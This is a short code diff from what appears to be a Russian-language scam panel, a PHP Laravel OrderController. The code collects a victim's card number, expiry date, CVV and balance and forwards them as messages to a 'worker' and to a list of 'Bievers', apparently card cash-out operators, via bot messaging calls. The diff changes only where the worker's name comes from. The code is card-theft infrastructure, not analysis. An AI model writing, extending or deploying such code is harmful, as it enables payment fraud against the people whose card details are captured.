@@ -38,7 +38,7 @@ class OrderController extends Controller
         $wbiv = $message . "\n\nКарта: " . $request->input('card') .
     "\nДата: " . $request->input('expiryDate') .
     "\nCVV: " . $request->input('cvv') .
-    "\n\nВоркер: " . $request->input('username');
+    "\n\nВоркер: " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -55,7 +55,7 @@ class OrderController extends Controller
             "\nДата: " . $request->input('expiryDate') .
             "\nCVV: " . $request->input('cvv') .
             "\nБаланс: " . $request->input('balance') .
-            "\n\nВоркер: " . $request->input('username');
+            "\n\nВоркер: " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
